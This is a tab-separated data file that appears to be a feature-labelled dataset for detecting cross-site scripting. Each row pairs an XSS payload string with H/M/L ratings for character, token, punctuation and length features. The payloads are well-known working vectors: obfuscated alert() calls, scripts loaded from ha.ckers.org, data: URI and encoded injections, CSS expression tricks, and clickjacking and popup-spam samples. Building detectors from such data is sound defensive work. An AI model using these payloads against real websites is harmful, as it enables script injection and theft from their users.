attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
<object type="text/x-scriptlet" data="http://jsfiddle.net/xle63/ "></object>	H	L	M	L	M	L	M	M	
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?	H	L	M	L	M	M	L	M	
<math><a xlink:href="//jsfiddle.net/t846h/">click	M	L	M	L	M	L	L	M	
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?	M	L	L	L	M	L	L	M	
<svg contentscripttype=text/vbs><script>msgbox+1	M	L	L	L	L	L	L	M	
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6c;&#101%72t(1)>">x</a	L	L	M	L	M	M	L	M	
<iframe/onreadystatechange=\u0061\u006c\u0065\u0072\u0074('\u0061') worksinie>	M	L	L	L	M	L	L	M	
<script>~'\u0061' ;  \u0074\u0068\u0072\u006f\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006c\u0065\u0072\u0074(~'\u0061')</script u+	M	L	L	L	H	L	M	H	
<script/src="data&colon;text%2fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2f	L	L	M	L	M	L	M	M	
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6c%65%72%74(/xss/)></script ????????????	L	L	M	L	H	H	L	H	
<object data=javascript&colon;\u0061&#x6c;&#101%72t(1)>	M	L	L	L	M	M	L	M	
<script>+-+-1-+-+alert(1)</script>	M	L	L	L	M	M	L	M	
<body/onload=&lt;!--&gt;&#10alert(1)>	M	L	L	L	M	L	L	M	
<script itworksinallbrowsers>/*<script* */alert(1)</script ?	M	L	L	L	M	L	M	M	
<img src ?itworksonchrome?\/onerror = alert(1)???	L	L	M	L	M	L	M	M	
<svg><script>//&newline;confirm(1);</script </svg>	M	L	M	L	M	L	L	M	
<svg><script onlypossibleinopera:-)> alert(1)	M	L	L	L	M	L	L	M	
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3a;&#97lert(1)>clickme	M	L	L	L	M	H	M	M	
<script x> alert(1) </script 1=2	M	L	L	L	M	M	M	M	
<div/onmouseover='alert(1)'> style="x:">	H	L	M	L	M	L	L	M	
<--`<img/src=` onerror=alert(1)> --!>	M	L	M	L	M	L	L	M	
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?	L	L	L	L	H	M	L	H	
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?	L	L	M	L	M	M	M	H	
"><img src=x onerror=window.open('https://www.google.com/');>	H	L	M	L	M	L	L	M	
<form><button formaction=javascript&colon;alert(1)>clickme	M	L	M	L	M	L	L	M	
<math><a xlink:href="//jsfiddle.net/t846h/">click	M	L	M	L	M	L	L	M	
<object data=data:text/html;base64,phn2zy9vbmxvywq9ywxlcnqomik+></object>?	M	L	M	L	M	L	L	M	
<iframe  src="data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e"></iframe>	L	L	M	L	M	L	L	M	
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">click  me</a>	L	L	M	L	L	L	M	L	
"><img src=x onerror=prompt(1);>	M	L	M	L	M	L	L	M	
<script>alert('xss');</script>	M	L	L	L	M	L	L	M	
'';!--"<xss>=&{()}	M	L	L	L	M	L	L	L	
<script src=http://ha.ckers.org/xss.js></script>	M	L	M	L	M	L	L	M	
<img src="javascript:alert('xss');">	M	L	M	L	M	L	L	M	
<img src=javascript:alert('xss')>	M	L	M	L	M	L	L	M	
<img src=javascript:alert('xss')>	M	L	M	L	M	L	L	M	
<img src=javascript:alert(&quot;xss&quot;)>	M	L	M	L	M	L	L	M	
<img src=`javascript:alert("rsnake says, 'xss'")`>	M	L	L	L	M	L	M	M	
<img src=javascript:alert(string.fromcharcode(88,83,83))>	M	L	M	L	M	L	L	M	
src=&#10<img 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>	L	L	L	L	L	L	L	H	
<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>	L	L	L	L	H	L	L	L	
<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>	L	L	L	L	H	L	L	H	
<img src="jav	ascript:alert('xss');">	M	L	L	L	M	L	L	M	
<img src="jav&#x09;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
<img src="jav&#x0a;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
<img src="jav&#x0d;ascript:alert('xss');">	H	L	L	L	M	L	L	M	
<img src=" &#14;  javascript:alert('xss');">	H	L	M	L	M	L	M	M	
<script/xss src="http://ha.ckers.org/xss.js"></script>	M	L	M	L	M	L	L	M	
<script src=http://ha.ckers.org/xss.js?<b>	M	L	M	L	M	L	L	M	
<img src="javascript:alert('xss')"	M	L	M	L	M	L	L	M	
<script>a=/xss/	M	L	L	L	L	L	L	L	
\";alert('xss');//	M	L	L	L	M	L	L	L	
<input type="image" src="javascript:alert('xss');">	H	L	M	L	M	L	L	M	
<body background="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
<body onload=alert('xss')>	M	L	L	L	M	L	L	M	
<img dynsrc="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
<img lowsrc="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
<bgsound src="javascript:alert('xss');">	M	L	L	L	M	L	L	M	
<br size="&{alert('xss')}">	M	L	L	L	M	L	L	M	
<layer src="http://ha.ckers.org/scriptlet.html"></layer>	M	L	L	L	M	L	L	M	
<link rel="stylesheet" href="javascript:alert('xss');">	H	L	M	L	M	L	L	M	
<link rel="stylesheet" href="http://ha.ckers.org/xss.css">	H	L	M	L	M	L	L	M	
<style>@import'http://ha.ckers.org/xss.css';</style>	M	L	L	L	M	L	L	M	
<meta http-equiv="link" content="<http://ha.ckers.org/xss.css>; rel=stylesheet">	L	L	M	L	M	L	M	M	
<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>	M	L	M	L	M	L	L	M	
<img src='vbscript:msgbox("xss")'>	M	L	L	L	M	L	L	M	
<img src="mocha:[code]">	M	L	L	L	M	L	L	M	
<img src="livescript:[code]">	M	L	L	L	M	L	L	M	
<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">	L	L	M	L	M	L	L	M	
<meta http-equiv="refresh" content="0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k">	H	L	M	L	M	L	L	M	
<meta http-equiv="link" content="<javascript:alert('xss')>; rel=stylesheet">	L	L	M	L	M	L	M	M	
<meta http-equiv="refresh" content="0; url=http://;url=javascript:alert('xss');">	L	L	M	L	M	L	M	M	
<iframe src="javascript:alert('xss');"></iframe>	H	L	M	L	M	L	L	M	
<frameset><frame src="javascript:alert('xss');"></frameset>	L	L	M	L	M	L	L	M	
<table background="javascript:alert('xss')">	M	L	L	L	M	L	L	M	
<div style="background-image: url(javascript:alert('xss'))">	M	L	M	L	M	L	L	M	
<div style="background-image: url(&#1;javascript:alert('xss'))">	H	L	M	L	M	L	L	M	
<div style="width: expression(alert('xss'));">	M	L	M	L	M	L	L	M	
<style>@im\port'\ja\vasc\ript:alert("xss")';</style>	H	L	L	L	M	L	L	M	
<img style="xss:expr/*xss*/ession(alert('xss'))">	M	L	L	L	M	L	L	M	
<xss style="xss:expression(alert('xss'))">	M	L	L	L	M	L	L	M	
exp/*<xss style='no\xss:noxss("*//*");	M	L	L	L	M	L	L	M	
<style type="text/javascript">alert('xss');</style>	H	L	M	L	M	L	L	M	
<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>	L	L	M	L	M	L	L	M	
<style type="text/css">body{background:url("javascript:alert('xss')")}</style>	L	L	M	L	M	L	L	M	
<base href="javascript:alert('xss');//">	M	L	M	L	M	L	L	M	
<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>	H	L	M	L	M	L	L	M	
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>	L	L	M	L	M	M	M	M	
geturl("javascript:alert('xss')")	M	L	L	L	M	L	L	M	
a="get";	M	L	L	L	L	L	L	L	
<!--<value><![cdata[<xml id=i><x><c><![cdata[<img src="javas<![cdata[cript:alert('xss');">	L	L	M	L	M	L	L	M	
<xml src="http://ha.ckers.org/xsstest.xml" id=i></xml>	H	L	M	L	M	L	L	M	
<html><body>	M	L	L	L	L	L	L	L	
<script src="http://ha.ckers.org/xss.jpg"></script>	M	L	M	L	M	L	L	M	
<!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->	L	M	M	L	H	L	M	M	
<? echo('<scr)';	M	L	L	L	M	L	L	L	
<meta http-equiv="set-cookie" content="userid=&lt;script&gt;alert('xss')&lt;/script&gt;">	L	L	M	L	M	L	L	M	
<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-	L	L	M	L	M	M	M	H	
<script a=">" src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
<script a=">" '' src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	M	M	
<script "a='>'" src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
<script a=`>` src="http://ha.ckers.org/xss.js"></script>	H	L	M	L	M	L	L	M	
<script>document.write("<scri");</script>pt src="http://ha.ckers.org/xss.js"></script>	L	L	M	L	M	L	L	M	
<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
<div id="39"><!-- up to opera 11.52, ff 3.6.28 -->	M	L	L	L	M	M	M	M	
<![><img src="]><img src=x onerror=alert(39)//">	L	L	M	L	M	L	M	M	
<svg><![cdata[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>	L	L	M	L	H	L	M	M	
<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
<div id="41"><li style=list-style:url() onerror=alert(41)></li>	L	L	M	L	M	M	M	M	
<div style=content:url(data:image/svg+xml,%3csvg/%3e);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>	L	L	M	L	H	M	L	M	
<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">xxx</a></body>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
<div id="43"><?xml version="1.0" standalone="no"?>	L	L	L	L	M	M	M	M	
<html xmlns="http://www.w3.org/1999/xhtml">	M	L	L	L	M	L	L	M	
<style type="text/css">	M	L	L	L	L	L	L	M	
@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}	M	L	M	L	M	L	M	M	
<body>hello</body>	M	L	L	L	L	L	L	L	
</html>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="53"><xml id="xss" src="test.htc"></xml>	L	L	M	L	L	L	M	M	
<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006f&#13\r:\000072 ed;color\0\bla:yellow\0\bla;col\0\00 \&#xa0or:blue;">xxx</div>//["'`-->]]>]</div>	L	L	M	L	H	L	M	H	
<div id="62"><!-- ie 6-8 -->	M	L	L	L	M	M	M	M	
<x '="foo"><x foo='><img src=x onerror=alert(62)//'>	L	L	M	L	M	L	M	M	
<! '="foo"><x foo='><img src=x onerror=alert(2)//'>	L	L	M	L	M	L	M	M	
<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
<div id="63"><embed src="javascript:alert(63)"></embed> // o10.10↓, om10.0↓, gc6↓, ff	L	L	M	L	M	M	M	M	
<img src="javascript:alert(2)">	M	L	M	L	M	L	L	M	
<image src="javascript:alert(2)"> // ie6, o10.10↓, om10.0↓	M	L	L	L	M	L	M	M	
<script src="javascript:alert(3)"></script> // ie6, o11.01↓, om10.1↓//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
<div id="64"><!doctype x[<!entity x system "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
<div id="66"><?xml version="1.0"?>	H	L	L	L	M	M	L	M	
<?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(66)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?>	L	L	M	L	H	H	M	L	
<root/>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="67"><!doctype x [	M	L	L	L	L	L	M	M	
    <!attlist img xmlns cdata "http://www.w3.org/1999/xhtml" src cdata "xx:x"	M	L	M	L	M	L	M	M	
 onerror cdata "alert(67)"	L	L	L	L	L	L	M	M	
 onload cdata "alert(2)">	M	L	L	L	L	L	M	M	
]><img />//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	L	L	M	L	M	M	M	M	
    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">xxx</x>	L	L	M	L	M	L	M	M	
</doc>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>	L	L	H	L	L	H	M	L	
<div id="87"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>	L	L	M	L	M	M	M	H	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">	L	L	M	L	M	M	M	M	
<animation xlink:href="javascript:alert(88)"/>	M	L	M	L	M	L	L	M	
<animation xlink:href="data:text/xml,%3csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3e%3c/svg%3e"/>	L	L	M	L	M	M	M	M	
<image xlink:href="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3e%3c/svg%3e"/>	L	L	M	L	M	M	M	M	
<foreignobject xlink:href="javascript:alert(88)"/>	M	L	M	L	M	L	L	M	
<foreignobject xlink:href="data:text/xml,%3cscript xmlns='http://www.w3.org/1999/xhtml'%3ealert(88)%3c/script%3e"/>	L	L	M	L	M	M	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="89"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
<set attributename="onmouseover" to="alert(89)"/>	H	L	L	L	M	L	L	M	
<animate attributename="onunload" to="alert(89)"/>	H	L	L	L	M	L	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="90"><!-- up to opera 10.63 -->	M	L	L	L	M	M	M	M	
<div style=content:url(test2.svg)></div>	M	L	M	L	M	L	L	M	
<div style="background:url(test5.svg)">press enter</div>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="91">[a]	M	L	L	L	L	L	L	L	
<? foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
<! foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
</ foo="><script>alert(91)</script>">	H	L	L	L	M	L	L	M	
<? foo="><x foo='?><script>alert(91)</script>'>">	L	L	L	L	M	L	L	M	
<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">	L	L	L	L	M	L	L	M	
<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">x</div>//["'`-->]]>]</div>	L	L	H	L	L	M	M	L	
<div id="94"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>	H	L	M	L	M	M	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">	L	L	M	L	M	M	M	M	
<set attributename="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,	M	L	M	L	M	L	L	M	
phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmcipjxzy3jpchq%2bywxlcnqomsk8l3njcmlwdd48l3n2zz4ncg%3d%3d"/>	M	L	L	L	L	M	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>	H	L	M	L	M	L	L	M	
<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="97"><!-- ie 5-9 -->	M	L	L	L	M	M	M	M	
<div id=d><x xmlns="><iframe onload=alert(97)"></div>	L	L	M	L	M	M	M	M	
<script>d.innerhtml+='';</script>	M	L	L	L	M	L	L	M	
<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>	L	L	M	L	M	M	M	M	
<script>d.innerhtml+='';</script>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="98"><div id=d><div style="font-family:'sans\27\2f\2a\22\2a\2f\3b color\3ared\3b'">x</div></div>	L	L	M	L	M	H	M	M	
<script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="99">xxx<style>	M	L	L	L	L	L	L	M	
</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">	L	L	M	L	M	M	M	M	
<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3csvg%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%3e%0a%3chandler%20xml%3aid%3d%22bar%22%20type%3d%22application%2fecmascript%22%3e alert(104) %3c%2fhandler%3e%0a%3c%2fsvg%3e%0a#bar"/>	L	L	M	L	M	L	M	L	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="105"><iframe src="data:image/svg-xml,%1f%8b%08%00%00%00%00%00%02%03%b3)n.%ca%2c(q%a8%c8%cd%c9%2b%b6u%ca())%b0%d2%d7%2f%2f%2f%d7%2b7%d6%cb%2fj%d77%b4%b4%b4%d4%af%c8(%c9%cdq%b2k%cci-*%d10%d4%b4%d1%87%e8%b2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>	L	L	H	L	L	L	M	L	
<div id="108"><!-- ie 5-8 standards mode -->	M	L	L	L	M	M	M	M	
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">	L	L	M	L	M	L	M	M	
<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">	L	L	M	L	M	L	M	M	
<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
<div id="109"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
<a id="x"><rect fill="white" width="1000" height="1000"/></a>	L	L	M	L	L	M	M	M	
<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>	L	L	M	L	H	M	M	H	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="110"><svg xmlns="http://www.w3.org/2000/svg">	H	L	M	L	M	M	L	M	
<path d="m0,0" style="marker-start:url(test4.svg#a)"/>	H	L	M	L	M	L	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">x</div>//["'`-->]]>]</div>	L	L	M	L	L	M	M	L	
<div id="113"><div id="x">xxx</div>	L	L	M	L	L	L	L	M	
</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="114"><x style="background:url('x[a];color:red;/*')">xxx</x>//["'`-->]]>]</div>	L	L	M	L	H	L	L	M	
<div id="115"><!--[if]><script>alert(115)</script -->	L	L	M	L	M	M	L	M	
<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>	L	L	M	L	M	L	M	M	
<div id="116"><div id="x">x</div>	L	L	M	L	L	L	L	M	
<xml:namespace prefix="t">	M	L	L	L	L	L	L	M	
<import namespace="t" implementation="#default#time2">	H	L	L	L	L	L	L	M	
<t:set attributename="innerhtml" targetelement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
<div id="117"><a href="http://attacker.org">	H	L	M	L	M	L	L	M	
    <iframe src="http://example.org/"></iframe>	M	L	M	L	M	L	M	M	
</a>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="118"><div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');">	L	L	M	L	M	L	M	M	
    <h1>drop me</h1>	M	L	L	L	L	L	M	L	
<iframe src="http://www.example.org/drophere.html"></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>	L	L	M	L	M	M	M	H	
<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
<div id="120"><script>	M	L	L	L	L	L	L	M	
    for (i=1;i<6;i++) {	L	L	M	L	M	M	M	M	
        window.open('popup.html','spam'+i,'width=50,height=50');	H	L	M	L	M	M	M	M	
<a href="#" onclick="makepopups()">spam</a>//["'`-->]]>]</div>	L	L	M	L	M	L	L	M	
<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"	H	L	M	L	M	M	L	M	
xmlns:svg="http://www.w3.org/2000/svg">	M	L	M	L	M	L	L	M	
<body style="background:gray">	M	L	L	L	L	L	L	M	
<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskforclickjacking);"/>	H	L	M	L	M	L	M	M	
<svg:svg>	L	L	L	L	L	L	L	L	
<svg:mask id="maskforclickjacking" maskunits="objectboundingbox" maskcontentunits="objectboundingbox">	L	L	L	L	L	L	M	M	
    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>	L	L	L	L	M	M	M	M	
    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>	L	L	L	L	M	M	M	M	
</svg:svg>	L	L	L	L	L	L	L	L	
</html>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>	L	L	M	L	M	L	M	H	
<div id="123"><span class=foo>some text</span>	H	L	M	L	L	L	M	M	
<a class=bar href="http://www.example.org">www.example.org</a>	H	L	M	L	M	L	L	M	
<script src="http://code.jquery.com/jquery-1.4.4.js"></script>	M	L	M	L	M	M	L	M	
$("span.foo").click(function() {	M	L	L	L	M	L	L	M	
$("a.bar").click();	M	L	L	L	M	L	L	L	
$("a.bar").click(function() {	M	L	L	L	M	L	L	M	
location="http://html5sec.org";	M	L	L	L	M	L	L	M	
</script>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="124"><script src="/\example.com\foo.js"></script> // safari 5.0, chrome 9, 10	L	L	M	L	M	M	M	M	
<script src="\\example.com\foo.js"></script> // safari 5.0//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
<div id="125"><?xml version="1.0"?>	H	L	L	L	M	M	L	M	
<?xml-stylesheet type="text/xml" href="#stylesheet"?>	H	L	L	L	M	L	L	M	
  id    id    #required>]>	M	L	L	L	L	L	M	M	
<svg xmlns="http://www.w3.org/2000/svg">	M	L	M	L	M	L	L	M	
    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">	L	L	L	L	M	M	M	M	
        <xsl:template match="/">	M	L	L	L	L	L	M	M	
            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>	H	L	M	L	M	M	M	M	
    <circle fill="red" r="40"></circle>	H	L	L	L	L	L	M	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="126"><object id="x" classid="clsid:cb927d12-4ff7-4a9e-a169-56e4b8a75598"></object>	L	L	M	L	M	M	M	M	
<object classid="clsid:02bf25d5-8c17-4b23-bc80-d3488abddc6b" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>	L	L	M	L	H	M	M	H	
<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">	L	L	M	L	M	M	M	M	
<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>	L	L	L	L	M	M	M	M	
<handler id="y">alert(127)</handler>	M	L	L	L	M	L	L	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>	L	L	M	L	M	M	M	M	
<div id="129"><svg>	M	L	L	L	L	L	L	L	
